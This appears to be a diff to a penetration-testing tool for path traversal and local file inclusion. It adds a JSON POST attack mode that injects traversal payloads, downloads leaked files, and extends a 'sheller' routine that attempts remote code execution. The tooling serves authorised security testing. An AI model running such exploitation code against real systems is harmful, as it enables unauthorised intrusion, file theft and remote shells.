@@ -25,6 +25,7 @@ import subprocess
 import base64
 import psutil
 import time
+import json
 
 import core.variables as vars
 
@@ -101,6 +102,30 @@ def query(traverse, dir, file, nb, keyword, url, url2, s):
     return (prep, p)
 
 
+def post_plain(url, data, s):
+    """
+    prepare request for POST attacks
+    """
+    req = requests.Request(method="POST", url=url, data=data)
+    prep = s.prepare_request(req)
+    new_body = unquote(prep.body)
+    prep.body = new_body
+    prep.headers["content-length"] = len(new_body)
+    return prep
+
+
+def post_json(url, data, s):
+    """
+    prepare request for POST attacks
+    """
+    req = requests.Request(method="POST", url=url, json=data)
+    prep = s.prepare_request(req)
+    # new_body = unquote(prep.body)
+    # prep.body = new_body
+    # prep.headers["content-length"] = len(new_body)
+    return prep
+
+
 def fix_url(url, attack):
     """
     reformat potentially misformated URLs to the attack expectations.
@@ -138,7 +163,7 @@ def initial_ping(s, attack, url, url2, keyword, timeout):
     @return: response contents for later analysis
     """
     # initial ping for filecheck
-    if attack != 4:
+    if attack not in [4, 5]:
         try:
             con2 = s.get(url, timeout=timeout).content
         except (
@@ -229,11 +254,16 @@ def attack_request(
             data[pair[0].strip()] = pair[1].strip()
         assert data != {}
         random_ua(s)
-        req = requests.Request(method="POST", url=url, data=data)
-        prep = s.prepare_request(req)
-        new_body = unquote(prep.body)
-        prep.body = new_body
-        prep.headers["content-length"] = len(new_body)
+        prep = post_plain(url, data, s)
+        r = s.send(prep, timeout=timeout)
+    elif attack == 5:
+        p = traverse + directory + file + nullbyte
+        activated = post_data.replace("INJECT", p)
+        activated = activated.replace("\\", "\\\\")
+        data = json.loads(activated)
+        assert data != {}
+        random_ua(s)
+        prep = post_json(url, data, s)
         r = s.send(prep, timeout=timeout)
 
     try:
@@ -251,7 +281,7 @@ def attack_request(
 
 def phase1(
     attack, url, url2, keyword, cookie, selected, verbose,
-    depth, paylist, file, authcookie, post_data, gui
+    depth, paylist, file, auth_cookie, post_data, gui
 ):
     """
     [Phase 1]: Vulnerability Analysis
@@ -266,7 +296,7 @@ def phase1(
         depth      - attack depth (-d INT)
         paylist    - payload list (all)
         file       - file to be looked up (-i FIL, default: /etc/passwd)
-        authcookie - Authentication Cookie File to bypass Login Screens
+        auth_cookie - Authentication Cookie File to bypass Login Screens
         post_data   - POST Data for --attack 4
         gui        - GUI frame to set the graphical progress bar
     """
@@ -299,10 +329,10 @@ def phase1(
     found_prefixes = []
     s = session()
 
-    if authcookie != "":
+    if auth_cookie != "":
         requests.utils.add_dict_to_cookiejar(
             s.cookies,
-            dict_from_header(authcookie),
+            dict_from_header(auth_cookie),
         )
 
     con2, con3 = initial_ping(s, attack, url, url2, keyword, timeout)
@@ -378,9 +408,9 @@ def phase1(
                 if str(r.status_code).startswith("2"):
                     if (
                         filecheck(r, con2, con3, p)
-                        and attack != 4
+                        and attack not in [4, 5]
                         or filecheck(r, con2, con3, p, post=True)
-                        and attack == 4
+                        and attack in [4, 5]
                     ):
                         payloads.append(i)
                         if nb != "":
@@ -396,11 +426,11 @@ def phase1(
 
                         print(out)
                 if verbose and not found:
-                    if attack == 1 or attack == 2:
-                        print(color.END + "{}|: ".format(r.status_code)+r.url)
-                    elif attack == 3 or attack == 4:
+                    if attack in [1, 2]:
+                        print(color.END + "{}|: ".format(r.status_code) + r.url)
+                    elif attack in [3, 4, 5]:
                         print(color.END + "{}|: ".format(
-                            r.status_code)+r.url + " : " + p
+                            r.status_code) + r.url + " : " + p
                         )
 
             if found:
@@ -412,7 +442,7 @@ def phase1(
 def phase2(
     attack, url, url2, keyword, cookie, selected, filespath,
     dirs, depth, verbose, dl, selected_payloads,
-    selected_nullbytes, selected_prefixes, authcookie,
+    selected_nullbytes, selected_prefixes, auth_cookie,
     post_data, dirlen, gui
 ):
     """
@@ -432,7 +462,7 @@ def phase2(
         selected_payloads  - payloads selected in phase 1
         selected_nullbytes - terminators selected in phase 1
         selected_prefixes  - PHP wrappers selected in phase 1
-        authcookie         - Authentication Cookie File
+        auth_cookie         - Authentication Cookie File
         post_data          - POST Data for --attack 4
         dirlen             - directory dictionary size (after permutations)
         gui                - GUI frame to set the graphical progress bar
@@ -464,10 +494,10 @@ def phase2(
     urls = []
     s = session()
 
-    if authcookie != "":
+    if auth_cookie != "":
         requests.utils.add_dict_to_cookiejar(
             s.cookies,
-            dict_from_header(authcookie),
+            dict_from_header(auth_cookie),
         )
 
     con2, con3 = initial_ping(s, attack, url, url2, keyword, timeout)
@@ -551,12 +581,12 @@ def phase2(
                             if str(r.status_code).startswith("2"):
                                 if (
                                     filecheck(r, con2, con3, p)
-                                    and attack != 4
+                                    and attack not in [4, 5]
                                     or filecheck(r, con2, con3, p, post=True)
-                                    and attack == 4
+                                    and attack in [4, 5]
                                 ):
                                     vfound = True
-                                    if attack == 1 or attack == 2:
+                                    if attack in [1, 2]:
                                         print(
                                             color.RD+"[INFO]" + color.O
                                             + " leak" + color.END + "       "
@@ -572,6 +602,8 @@ def phase2(
                                             download(
                                                 r.url,
                                                 dir + file,
+                                                attack,
+                                                s,
                                                 cookie=s.cookies,
                                             )
                                         found.append(dir + file)
@@ -611,6 +643,8 @@ def phase2(
                                             download(
                                                 r.url,
                                                 dir + file,
+                                                attack,
+                                                s,
                                                 cookie=s.cookies,
                                             )
                                         found.append(dir + file)
@@ -620,7 +654,7 @@ def phase2(
                                             + str(r.status_code)
                                             + color.END + " " + p
                                         )
-                                    elif attack == 4:
+                                    elif attack in [4, 5]:
                                         print(
                                             color.RD + "[INFO]" + color.O
                                             + " leak" + color.END + "       "
@@ -635,6 +669,8 @@ def phase2(
                                             download(
                                                 r.url,
                                                 dir + file,
+                                                attack,
+                                                s,
                                                 cookie=s.cookies,
                                                 post=data,
                                             )
@@ -647,11 +683,11 @@ def phase2(
                                         )
 
                             if verbose and not vfound:
-                                if attack == 1 or attack == 2:
+                                if attack in [1, 2]:
                                     print(color.END + "{}|: ".format(
                                         r.status_code) + r.url,
                                     )
-                                elif attack == 3 or attack == 4:
+                                elif attack in [3, 4, 5]:
                                     print(color.END + "{}|: ".format(
                                         r.status_code) + r.url + " : " + p
                                     )
@@ -664,7 +700,7 @@ def phase2(
 def sheller(
     technique, attack, url, url2, keyword, cookie, selected,
     verbose, paylist, nullist, wlist,
-    authcookie, post_data, depth, gui, app
+    auth_cookie, post_data, depth, gui, app
 ):
     """
     second exploitation module: try to gain a
@@ -709,10 +745,10 @@ def sheller(
     elif technique == 6:
         success = ["something here"]
 
-    if authcookie != "":
+    if auth_cookie != "":
         requests.utils.add_dict_to_cookiejar(
             s.cookies,
-            dict_from_header(authcookie),
+            dict_from_header(auth_cookie),
         )
 
     con2, con3 = initial_ping(
@@ -772,19 +808,19 @@ def sheller(
                     if str(r.status_code).startswith("2"):
                         if (
                             filecheck(r, con2, con3, p)
-                            and attack != 4
+                            and attack not in [4, 5]
                             or filecheck(r, con2, con3, p, post=True)
-                            and attack == 4
+                            and attack in [4, 5]
                         ):
                             success = (r, p, nb, data, traverse)
                             found = True
                             break
                     if verbose:
-                        if attack == 1 or attack == 2:
+                        if attack in [1, 2]:
                             print(color.END + "{}|: ".format(
                                 r.status_code) + r.url
                             )
-                        elif attack == 3 or attack == 4:
+                        elif attack in [3, 4, 5]:
                             print(color.END + "{}|: ".format(
                                 r.status_code)+r.url + " : " + p
                             )
@@ -817,13 +853,9 @@ def sheller(
                 req = requests.Request(method="GET", url=url)
                 prep = s.prepare_request(req)
             elif attack == 4:
-                req = requests.Request(
-                    method="POST", url=url, data=success[3]
-                )
-                prep = s.prepare_request(req)
-                new_body = unquote(prep.body)
-                prep.body = new_body
-                prep.headers["content-length"] = len(new_body)
+                prep = post_plain(url, success[3], s)
+            elif attack == 5:
+                prep = post_json(url, success[3], s)
 
         if technique == 1:
             prep.headers[
@@ -1128,15 +1160,22 @@ def sheller(
                     req = requests.Request(method="GET", url=url)
                     prep = s.prepare_request(req)
                 elif attack == 4:
-                    req = requests.Request(
-                        method="POST",
-                        url=url,
-                        data=wrapper,
-                    )
-                    prep = s.prepare_request(req)
-                    new_body = unquote(prep.body)
-                    prep.body = new_body
-                    prep.headers["content-length"] = len(new_body)
+                    data = {}
+                    for prop in post_data.split("&"):
+                        pair = prop.split("=")
+                        if pair[1].strip() == "INJECT":
+                            pair[1] = wrapper
+                        data[pair[0].strip()] = pair[1].strip()
+                    assert data != {}
+                    random_ua(s)
+                    prep = post_plain(url, data, s)
+                elif attack == 5:
+                    activated = post_data.replace("INJECT", wrapper)
+                    activated = activated.replace("\\", "\\\\")
+                    data = json.loads(activated)
+                    assert data != {}
+                    random_ua(s)
+                    prep = post_json(url, data, s)
                 try:
                     s.send(prep, timeout=timeout)
                     show_status(gui)
@@ -1226,7 +1265,7 @@ def sheller(
 def lfi_rce(
     techniques, attack, url, url2, keyword, cookie,
     selected, verbose, paylist, nullist,
-    wlist, authcookie, post_data, depth, gui=None, app=None
+    wlist, auth_cookie, post_data, depth, gui=None, app=None
 ):
     """
     invoke sheller() for each technique
@@ -1244,7 +1283,7 @@ def lfi_rce(
         sheller(
             technique, attack, url, url2, keyword, cookie,
             selected, verbose, paylist, nullist,
-            wlist, authcookie, post_data, depth, gui, app
+            wlist, auth_cookie, post_data, depth, gui, app
         )
 
 
